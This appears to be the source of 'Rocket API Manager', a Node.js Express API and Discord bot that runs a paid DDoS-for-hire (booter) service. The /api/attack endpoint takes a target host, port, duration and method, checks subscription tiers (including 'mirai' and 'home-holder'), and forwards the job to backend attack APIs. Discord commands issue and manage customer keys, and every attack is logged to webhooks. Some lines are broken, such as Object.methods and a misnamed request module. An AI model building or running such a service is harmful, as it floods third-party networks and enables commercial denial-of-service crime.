const SSH = require('simple-ssh');
// parser to parse the data(separated by tabs and spaces)
const parser = require('node-csv-parse');
const express = require("express");
const http = require("http");
const ssh2 = require("ssh2");
const request = require("requests");
const moment = require("moment")
const cheerio = require("cheerio");
const config = require("./config.json");
const fs = require("fs");
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const router = express.Router();
const app = express();

app.set("view engine", "js");
app.set("trust proxy", 1);
console.clear();

setInterval(() => {
    const keyFile = fs.readFileSync("keys.json");
    let keyData = JSON.parse(keyFile);

    for (let key in keyData) {
        keyData[key].curCons = 0;
    }
    fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {});
}, 300 * 1000);



router.get("/", (req, res) => {
res.send("Rocket API Manager - Free Build");
});
module.exports = router;




app.get("/api/methods", (req, res) => {
    let query = req.query;
    let keys = JSON.parse(fs.readFileSync("./keys.json", "UTF-8").toString());
    let methods = JSON.parse(fs.readFileSync("./methods.json", "UTF-8").toString());

    if (!query.key) return res.json({error: true, message: "Invalid API key"});

    if (query.key) {
        if (keys[query.key]) {
            res.json({error: false, methods: Object.keys(methods)});

        } else {
            return res.status(401).json({error: true, message: "Invalid API key"});
        }
    } else {
        return res.status(400).json({error: true, message: "Please provide a key"});
    }
});






app.get("/api/info", (req, res) => {
    let query = req.query;
    let keys = JSON.parse(fs.readFileSync("./keys.json", "UTF-8"));

    if (!query.key) return res.status(400).json({error: true, message: "Please provide a key"});

    if (query.key) {
        if (keys[query.key]) {
            let key = keys[query.key];

            res.json({
                error: false,
                expiry: key.expiry,
                concurrents: key.maxCons,
                time: key.time,
                attacks: key.totalattacks,
                running: key.curCons,
            });
        } else {
            return res.status(401).json({error: true, message: "Invalid API key"});
        }
    } else {
        return res.status(400).json({error: true, message: "Please provide a key"});
    }
});


app.get("/api/attack", async (req, res) => {
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;
    const key = req.query.key;
    const config = require("./config.json");
    const total1 = fs.readFileSync("config.json");
    let total2 = JSON.parse(total1);

    const keyFile = fs.readFileSync("keys.json");
    let keyData = JSON.parse(keyFile);

    const tot = fs.readFileSync("config.json");
    let Atk = JSON.parse(tot);

    //const mirai = require("./servers.json");
  
    const API = fs.readFileSync("methods.json");
    let apis = JSON.parse(API);




    const methodFile = fs.readFileSync("methods.json");
    let methods = JSON.parse(methodFile);

    try {
        parseInt(time);
    } catch (err) {
        return res.send({"error": true, "message": "time must be an integer."});
    }

    try {
        parseInt(port);
    } catch (err) {
        return res.send({"error": true, "message": "port must be an integer."});
    }
    if (!(host && port && time && method && key)) return await res.send({"error": true, "message": "missing parameters."});
    if (!keyData[key]) return await res.send({"error": true, "message": "invalid key."});
    if (keyData[key].banned == true) return await res.send({"error": true, "message": "key is banned."});
    if (!apis[method]) return await res.send({"error": true, "message": "invalid method."});
    if (keyData[key].mirai == false && apis[method].type == "mirai") return await res.send({"error": true, "message": "You need mirai access."});
    if (keyData[key].vip == false && apis[method].type == "vip") return await res.send({"error": true, "message": "You need vip access."});
    if (keyData[key].holder == false && apis[method].type == "home-holder") return await res.send({"error": true, "message": "You need homeholder access."});
    if (config.blacklist.hosts.includes(host)) return await res.send({"error":true,"message":"host is blacklisted."});
    if (time > keyData[key]["time"]) return await res.send({"error": true, "message": "maximum time reached."});
    if (time > methods[method].maxtime) return await res.send({"error": true, "message": "maximum time reached for this method."});
    if (keyData[key].curCons >= keyData[key].maxCons) return await res.send({"error": true, "message": "maximum concurrents reached."});

    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1;
    const currentDay = new Date().getDate();
    const together = [currentYear, currentMonth, currentDay];
    if ("expiry" in keyData[key]) {
        const expiry = moment(keyData[key].expiry.toString(), ["MMMM DD, YYYY", "x", "X", "MM/DD/YYYY"]);
        if (expiry.isSameOrBefore(moment())) return res.status(401).json({error: true, message: "Key has expired."});
    }
    const hook = new Webhook(keyData[key].webhook);
    const total = (keyData[key].totalattacks);
    const ongoing = (keyData[key].curCons);
    const user = (keyData[key].discord);
    const totalat = (total2.total.totalattacks);
    const main = new Webhook(config.webhook.webhook);
    const funnel =  (apis.link + apis.host + host + apis.port + port + apis.time + time);
    const footer = config.webhook.footer;
    const gif = config.webhook.gif;
    const colour = config.webhook.colour;
    const KeysAttacks = Object.values(Keys).reduce((acc, key) => { return acc + key.totalattacks; }, 0);
    total2.total.totalattacks += 1;
    fs.writeFile("config.json", JSON.stringify(total2, null, 4), (err) => {});
    





     const net = new MessageBuilder()
    .setTitle("API Logs")
    .setColor(`${colour}`)
    .addField(`Host`,   `${host}`, true)
    .addField(`Port`,   `${port}`, true)
    .addField(`Time`,   `${time}`, true)
    .addField(`Method`, `${method}`, true)
    .addField(`Key`,     `${key}`, true)
    .addField(`Discord`,     `${user}`, true)
    .addField(`Total Network Attacks`,     `${totalat}`, true)
    .setFooter('Rocket API Manager By Kitty x Evo')
    .setThumbnail(`${gif}`)
    .setTimestamp();
     main.send(net);
     

    config.total.totalattacks += 1;
    fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {});

    keyData[key].totalattacks += 1;
    fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {});
    const embed = new MessageBuilder()
    .setTitle("API Logs")
    .setColor(`${colour}`)
    .addField(`Host`,   `${host}`, true)
    .addField(`Port`,   `${port}`, true)
    .addField(`Time`,   `${time}`, true)
    .addField(`Method`, `${method}`, true)
    .addField(`Key`,     `${key}`, true)
    .addField(`Total Attacks`,     `${total}`, true)
    .addField(`Ongoing`,     `${ongoing}`, true)
    .setFooter('Rocket API Manager By Kitty x Evo')
    .setThumbnail(`${gif}`)
    .setTimestamp();
    hook.send(embed);

    if(apis[method].type == "vip"){
        const FormattedJsonLink = methods[method].api.replace("<<$host>>", host).replace("<<$port>>", port).replace("<<$time>>", time);
        request(FormattedJsonLink);
        //console.log(FormattedJsonLink);
    }
    if(apis[method].type == "normal"){
    const FormattedJsonLink = methods[method].api.replace("<<$host>>", host).replace("<<$port>>", port).replace("<<$time>>", time);
    request(FormattedJsonLink);
    //console.log(FormattedJsonLink);
}
    keyData[key].curCons += 1;
    await fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {
  res.send({"error": false, "message": "successfully sent attack.", "creators": "Rocket API Manager Made By Kitty x Evo"});
        setTimeout(() => {
            keyData[key].curCons -= 1;
            fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {});
        }, parseInt(time) * 1000);
    });
});









app.get("/api/updates", (req, res) => {
for (const apiname of config.api.apiname)
for (const updates of config.api.updates)
    res.send(`${apiname}: ${updates}`);
});

app.get("/", (req, res) => {
res.send("Rocket API Manager - Free Build");
});



console.log("[38;2;5;189;245m[[38;2;11;185;243m-[38;2;17;181;241m][38;2;23;177;239m [38;2;29;173;237mR[38;2;35;169;235mo[38;2;41;165;233mc[38;2;47;161;231mk[38;2;53;157;229me[38;2;59;153;227mt[38;2;65;149;225m [38;2;71;145;223mA[38;2;77;141;221mP[38;2;83;137;219mI[38;2;89;133;217m [38;2;95;129;215mM[38;2;101;125;213ma[38;2;107;121;211mn[38;2;113;117;209ma[38;2;119;113;207mg[38;2;125;109;205me[38;2;131;105;203mr[38;2;137;101;201m [38;2;143;97;199m-[38;2;149;93;197m [38;2;155;89;195mF[38;2;161;85;193mr[38;2;167;81;191me[38;2;173;77;189me[38;2;179;73;187m [38;2;185;69;185mB[38;2;191;65;183mu[38;2;197;61;181mi[38;2;203;57;179ml[38;2;209;53;177md[0;00m");
console.log("[38;2;5;189;245m[[38;2;14;182;242m-[38;2;23;175;239m][38;2;32;168;236m [38;2;41;161;233mC[38;2;50;154;230mo[38;2;59;147;227mn[38;2;68;140;224mf[38;2;77;133;221mi[38;2;86;126;218mg[38;2;95;119;215m.[38;2;104;112;212mj[38;2;113;105;209ms[38;2;122;98;206mo[38;2;131;91;203mn[38;2;140;84;200m [38;2;149;77;197mL[38;2;158;70;194mo[38;2;167;63;191ma[38;2;176;56;188md[38;2;185;49;185me[38;2;194;42;182md[0;00m");
console.log("[38;2;5;189;245m[[38;2;14;183;242m-[38;2;23;177;239m][38;2;32;171;236m [38;2;41;165;233mM[38;2;50;159;230me[38;2;59;153;227mt[38;2;68;147;224mh[38;2;77;141;221mo[38;2;86;135;218md[38;2;95;129;215ms[38;2;104;123;212m.[38;2;113;117;209mj[38;2;122;111;206ms[38;2;131;105;203mo[38;2;140;99;200mn[38;2;149;93;197m [38;2;158;87;194mL[38;2;167;81;191mo[38;2;176;75;188ma[38;2;185;69;185md[38;2;194;63;182me[38;2;203;57;179md[0;00m");
console.log("[38;2;5;189;245m[[38;2;15;182;242m-[38;2;25;175;239m][38;2;35;168;236m [38;2;45;161;233mK[38;2;55;154;230me[38;2;65;147;227my[38;2;75;140;224ms[38;2;85;133;221m.[38;2;95;126;218mj[38;2;105;119;215ms[38;2;115;112;212mo[38;2;125;105;209mn[38;2;135;98;206m [38;2;145;91;203mL[38;2;155;84;200mo[38;2;165;77;197ma[38;2;175;70;194md[38;2;185;63;191me[38;2;195;56;188md[0;00m");
console.log("[38;2;5;189;245m[[38;2;14;183;242m-[38;2;23;177;239m][38;2;32;171;236m [38;2;41;165;233mD[38;2;50;159;230mi[38;2;59;153;227ms[38;2;68;147;224mc[38;2;77;141;221mo[38;2;86;135;218mr[38;2;95;129;215md[38;2;104;123;212m [38;2;113;117;209mB[38;2;122;111;206mo[38;2;131;105;203mt[38;2;140;99;200m [38;2;149;93;197mS[38;2;158;87;194mt[38;2;167;81;191ma[38;2;176;75;188mr[38;2;185;69;185mt[38;2;194;63;182me[38;2;203;57;179md[0;00m");
for ( const port of config.ports.ports) {
    http.createServer(app).listen(port, function () {
        console.log("[38;2;5;189;245m[[38;2;12;184;243m-[38;2;19;179;241m][38;2;26;174;239m [38;2;33;169;237mW[38;2;40;164;235me[38;2;47;159;233mb[38;2;54;154;231mS[38;2;61;149;229me[38;2;68;144;227mr[38;2;75;139;225mv[38;2;82;134;223me[38;2;89;129;221mr[38;2;96;124;219m [38;2;103;119;217mS[38;2;110;114;215mt[38;2;117;109;213ma[38;2;124;104;211mr[38;2;131;99;209mt[38;2;138;94;207me[38;2;145;89;205md[38;2;152;84;203m [38;2;159;79;201mO[38;2;166;74;199mn[38;2;173;69;197m [38;2;180;64;195mP[38;2;187;59;193mo[38;2;194;54;191mr[38;2;201;49;189mt", `${port}`);
    });
}
const { Client, MessageEmbed } = require('discord.js');
const Config = require("./config.json");
const Keys = require("./keys.json");
const methods = require("./methods.json");
const { query } = require("express");
const RequestBase = require("superagent/lib/request-base");
const colour = config.webhook.colour;
const activities_list = [
    "Rocket-api.co", 
    "API Manager",
    "Home-Holder", 
    "$10/m",
    ]; 


const client = new Client({
    intents: 32767
});

client.on('ready', () => {
    
    setInterval(() => {
        const index = Math.floor(Math.random() * (activities_list.length - 1) + 1);
        client.user.setActivity(activities_list[index]);
    }, 5000); 
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    var messageArray = message.content.split(" ");
    var cmd = messageArray[0].toLowerCase();
    var args = messageArray.slice(1);
    if (!message.content.startsWith(Config.bot.prefix)) return;
    cmd = cmd.slice(Config.bot.prefix.length);



    const keyFile = fs.readFileSync("keys.json");
    let keyData = JSON.parse(keyFile);

    if (cmd) message.delete({ timeout: 2000 });
    switch (cmd) {
        case "key":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");

            const MaxTime = args[0];
            const Expiry = args[1];
            const Cons = args[2];
            const Hook = args[3];
            const Discord = args[4];
            if (!MaxTime) return message.channel.send("Please specify a max time!");
            if (!Expiry) return message.channel.send("Please specify an expiry time!");
            if (!Cons) return message.channel.send("Please specify maximum concurrents!");
            if (!Hook) return message.channel.send("Please specify a hook!");
            if (!Discord) return message.channel.send("Please specify a hook!");
            const KeyGen = GenToken(25);

            Keys[KeyGen] = {
                discord: Discord,
                time: parseInt(MaxTime),
                expiry: Expiry,
                maxCons: Cons,
                webhook: Hook,
                curCons: 0,
                totalattacks: 0,
                banned: false,
                mirai: false,
                holder: false
            };
            fs.writeFile("keys.json", JSON.stringify(Keys, null, 4), (err) => {});

            const GenEmbed = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("Key Generated")
                .addField(`Max Time`, `${MaxTime}`, true)
                .addField(`Cons`, `${Cons}`, true)
                .addField(`Expiry`, `${Expiry}`, true)
                .addField(`Key`, `${KeyGen}`, true)
                .addField(`Discord`, `${Discord}`, true)
                .addField(`WebHook`, `${Hook}`, true)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
                .setTimestamp();
            message.channel.send({ embeds: [GenEmbed] });
            break
        
        case "delete":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const KeyToDelete = args[0];
            if (!KeyToDelete) return message.channel.send("Please specify a key!");
            if (!Keys[KeyToDelete]) return message.channel.send("Key not found!");
            delete Keys[KeyToDelete];
            fs.writeFile("keys.json", JSON.stringify(Keys, null, 4), (err) => {});
            message.channel.send("Key deleted!");
            break


        case "ban":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const banned = true;
            const Keytobebanned = args[0]
            Keys[Keytobebanned].banned = banned;
            fs.writeFileSync("keys.json", JSON.stringify(Keys, null, 4));
            if (!Keytobebanned) return message.channel.send("Please specify a key!");
            if (!Keys[Keytobebanned]) return message.channel.send("Key not found!");
            const Banned = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("Banned")
                .setDescription(`${Keytobebanned}\n Has Been Banned`)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [Banned] });
            break


        case "unban":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const keyunbanned = false;
            const Keytobeunbanned = args[0]
            Keys[Keytobeunbanned].banned = keyunbanned ;
            fs.writeFileSync("keys.json", JSON.stringify(Keys, null, 4));
            if (!Keytobeunbanned) return message.channel.send("Please specify a key!");
            if (!Keys[Keytobeunbanned]) return message.channel.send("Key not found!");
            const unbanned = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("Unbanned")
                .setDescription(`${Keytobeunbanned}\n Has Been Unbanned`)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [unbanned] });
            break


        case "attacks":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const KeyToCheck = args[0];
            if (!KeyToCheck) return message.channel.send("Please specify a key!");
            if (!Keys[KeyToCheck]) return message.channel.send("Key not found!");
            const AttackEmbed = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("Key Attacks")
                .setDescription(`Key: ${KeyToCheck}\nAttacks: ${Keys[KeyToCheck].totalattacks}`)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [AttackEmbed] });
            break


        case "info":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const Info = args[0];
            if (!Info) return message.channel.send("Please specify a key!");
            if (!Keys[Info]) return message.channel.send("Key not found!");
            const InfoEmbed = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("Key Info")
                .setDescription(`Key: ${Info}\nDiscord: ${Keys[Info].discord}\nExpires: ${Keys[Info].expiry}\nAttacks: ${Keys[Info].totalattacks}\nMaxtime: ${Keys[Info].time}\nConcurents: ${Keys[Info].maxCons}`)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [InfoEmbed] });
            break


        
        case "all":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const KeysAttacks = Object.values(Keys).reduce((acc, key) => { return acc + key.totalattacks; }, 0);
            const TotalAttacksEmbed = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("Total Attacks")
                .setDescription(`Total Attacks: ${KeysAttacks}`)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [TotalAttacksEmbed] });
            break

        case "keys":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const ListKeysEmbed = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("List Keys")
                .setDescription(`${Object.keys(Keys).map(key => `Key: **${key}** Max Time: **${Keys[key].time}** Expiry: **${Keys[key].expiry}** Max Cons: **${Keys[key].maxCons}**`).join("\n")}`)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [ListKeysEmbed] });
            break

        case "methods":
            if (!Config.bot.adminids.includes(message.author.id)) return message.channel.send("You are not an admin!");
            const Listmethods = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("List Methods")
                .setDescription(`${Object.methods(methods).map(method => `**${method}**`).join("\n")}`)
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [Listmethods] });
            break




        case "help":
            const HelpEmbed = new MessageEmbed()
                .setColor(`${colour}`)
                .setTitle("Rocket Manager Help")
                .setDescription(`**Prefix**: ${Config.bot.prefix}
**Commands**:
**key**     | [maxtime] [expiry(1/0/2233)] [cons] [webhook] [discord]
**Info**    | [kry]
**delete**  | [key]
**attacks** | [key]
**ban**     | [key]
**unban**   | [key]
**all**     |
**keys**    | `)
                .setTimestamp()
                .setThumbnail("https://cdn.dribbble.com/users/1374371/screenshots/2964599/media/5a5945acb90389a8a85c0e21e34209b5.gif")
            message.channel.send({ embeds: [HelpEmbed] });
            break
        
        default:
            break;
    }
});

function GenToken(g) {
    var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    var token = "";
    for (var i = 0; i < g; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
}

client.login(Config.bot.token);

process.on('uncaughtException', err => (""));
process.on('unhandledRejection', err => (""));
module.exports = router;